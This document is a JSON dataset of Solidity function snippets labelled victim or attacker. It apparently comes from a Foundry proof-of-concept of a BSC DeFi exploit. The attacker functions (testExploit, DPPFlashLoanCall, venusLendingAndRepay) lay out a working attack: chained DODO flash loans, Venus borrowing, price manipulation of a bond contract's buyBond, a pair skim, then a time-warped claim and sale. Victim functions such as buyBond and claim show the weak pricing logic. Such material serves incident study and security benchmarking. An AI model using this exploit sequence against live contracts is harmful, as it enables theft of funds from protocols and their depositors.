[
  {
    "contract/interface": "VUSDT",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(address token, uint256 amount) external onlyOwner nonReentrant poolOngoing {\n",
    "description": ""
  },
  {
    "contract/interface": "VUSDT",
    "source_type": "victim_contract",
    "function_name": "repayBorrow",
    "original_code": "    function repayBorrow(uint repayAmount) external returns (uint) {\n        repayAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external payable {\n        if (msg.sender == dodo1) {\n            WBNB_BUSD_Pair_Loan();\n        } else if (msg.sender == dodo2) {\n            ETH_USDT_Pair_Loan1();\n        } else if (msg.sender == dodo3) {\n            WBNB_USDT_Pair_Loan();\n        } else if (msg.sender == dodo4) {\n            BTCB_BUSD_Pair_Loan();\n        } else if (msg.sender == dodo5) {\n            ETH_USDT_Pair_Loan2();\n        } else if (msg.sender == dodo6) {\n            ETH_BUSD_Pair_Loan();\n        } else if (msg.sender == dodo7) {\n            BTCB_USDT_Pair_Loan();\n        } else if (msg.sender == dodo8) {\n            venusLendingAndRepay();\n            BTCB.transfer(dodo8, amount15);\n            USDT.transfer(dodo8, amount16);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode\n        cheats.createSelectFork(\"bsc\", 22_169_169);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public payable {\n        address(WBNB).call{value: 5 ether}(\"\");\n        // add LP\n        addLiquidity();\n        // FlashLoan manipulate price, then buy bond\n        buyBond();\n        // change time pass time check , claim reward\n        cheats.warp(block.timestamp + 3 * 24 * 60 * 60);\n        claimAndSell();\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "venusLendingAndRepay",
    "original_code": "    function venusLendingAndRepay() public payable {\n        uint256 BNBAmount = WBNB.balanceOf(address(this));\n        address(WBNB).call(abi.encodeWithSignature(\"withdraw(uint)\", BNBAmount));\n        uint256 BUSDAmount = BUSD.balanceOf(address(this));\n        uint256 ETHAmount = ETH.balanceOf(address(this));\n        uint256 BTCBAmount = BTCB.balanceOf(address(this));\n        address[] memory cTokens = new address[](5);\n        cTokens[0] = address(vBNB);\n        cTokens[1] = address(vUSDT);\n        cTokens[2] = address(vBUSD);\n        cTokens[3] = address(vETH);\n        cTokens[4] = address(vBTC);\n        unitroller.enterMarkets(cTokens);\n        vBNB.mint{value: BNBAmount}();\n        BUSD.approve(address(vBUSD), type(uint256).max);\n        vBUSD.mint(BUSDAmount);\n        ETH.approve(address(vETH), type(uint256).max);\n        vETH.mint(ETHAmount);\n        BTCB.approve(address(vBTC), type(uint256).max);\n        vBTC.mint(BTCBAmount);\n        (, uint256 amount,) = unitroller.getAccountLiquidity(address(this));\n\n        vUSDT.borrow(amount * 99 / 100);\n        USDT.transfer(address(Pair), USDT.balanceOf(address(this)));\n        bond.buyBond(Pair.balanceOf(address(this)), 0);\n        Pair.skim(address(this));\n        USDT.approve(address(vUSDT), type(uint256).max);\n        vUSDT.repayBorrow(amount * 99 / 100);\n        vBNB.redeemUnderlying(BNBAmount);\n        address(WBNB).call{value: address(this).balance}(\"\");\n        vBUSD.redeemUnderlying(BUSDAmount);\n        vETH.redeemUnderlying(ETHAmount);\n        vBTC.redeemUnderlying(BTCBAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBNB",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address user, uint256 value) external onlyOwner {\n        _mint(user, value);\n        emit Mint(user, value);\n    }\n\n    /// @notice Burn certain amount of token on user account\n",
    "description": ""
  },
  {
    "contract/interface": "VBNB",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "    function redeemUnderlying(uint redeemAmount) external returns (uint) {\n        redeemAmount; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bond",
    "source_type": "victim_contract",
    "function_name": "buyBond",
    "original_code": "    function buyBond(uint256 lpAmount, uint256 bondId) public {\n        require( bondList[bondId].isActive && bondList[bondId].sigBalance > bondList[bondId].sigBalanceLowerCap, \"Bond have not yet activated\");\n\n        uint256 sigAmount = LpToSig(bondList[bondId].lpToken, lpAmount).mul(bondList[bondId].premiumPercentage).div(profitDenominator);\n\n        if(sigAmount > bondList[bondId].sigBalance || bondList[bondId].sigBalance - sigAmount <= bondList[bondId].sigBalanceLowerCap)\n        {\n            sigAmount = bondList[bondId].sigBalance - bondList[bondId].sigBalanceLowerCap;\n            lpAmount = SIGtoLP(bondList[bondId].lpToken,sigAmount).mul(profitDenominator).div(bondList[bondId].premiumPercentage);\n        }\n\n        \n        bondData[currentBondId].amount = sigAmount;\n\n        //IBEP20(bondList[bondId].lpToken).transferFrom(msg.sender, address(this), lpAmount);\n        IBEP20(bondList[bondId].lpToken).transferFrom(msg.sender, vault, lpAmount);\n\n        bondHolders[msg.sender].add(currentBondId);\n\n        bondData[currentBondId].releaseTimeStamp = block.timestamp + bondList[bondId].lockingPeriod;\n        bondData[currentBondId].bondMetadataId = bondId;\n\n        currentBondId = currentBondId +1;\n        bondList[bondId].sigBalance = bondList[bondId].sigBalance - sigAmount;\n\n        if(bondList[bondId].sigBalance <= bondList[bondId].sigBalanceLowerCap)\n        {\n            bondList[bondId].isActive = false;\n        }\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Bond",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "    function claim(uint256 index) public noReentrant {\n\n        if( bondData[bondHolders[msg.sender].at(index)].releaseTimeStamp < block.timestamp)\n        {\n            bep20Token.transfer(msg.sender,bondData[bondHolders[msg.sender].at(index)].amount);\n            bondHolders[msg.sender].remove(bondHolders[msg.sender].at(index));\n        }\n\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Unitroller",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Unitroller",
    "source_type": "victim_contract",
    "function_name": "getAccountLiquidity",
    "original_code": "",
    "description": ""
  }
]